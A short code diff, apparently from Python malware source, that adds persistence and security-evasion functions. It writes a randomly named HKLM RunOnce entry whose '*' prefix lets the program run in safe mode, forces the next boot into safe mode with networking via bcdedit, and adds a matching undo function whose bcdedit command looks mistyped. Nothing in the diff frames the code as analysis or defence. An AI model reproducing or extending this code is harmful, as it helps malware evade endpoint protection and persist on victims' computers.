@@ -33,16 +33,18 @@ def is_secure_boot() -> bool:
 
 
 
-
-
 def addRun_once():
     reg_key = random_string(is_random=True)
     reg_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' # this does not get executed
 
-    setRegistryKey(key_name=reg_key,value=f"cmd /c start {get_current_file_path()}",registry_path=reg_path,HKLM=True)
+    setRegistryKey(key_name=reg_key,value=f"*{get_current_file_path()}",registry_path=reg_path,HKLM=True)
     return True
 
 
 def enable_safemode():
-    run_detached_process("bcdedit /set {current} safeboot Minimal")
+    run_detached_process("bcdedit /set {default} safeboot network")
+    return
+
+def disable_safemod():
+    run_detached_process("bcdedit / deletevalue {default} safeboot")
     return
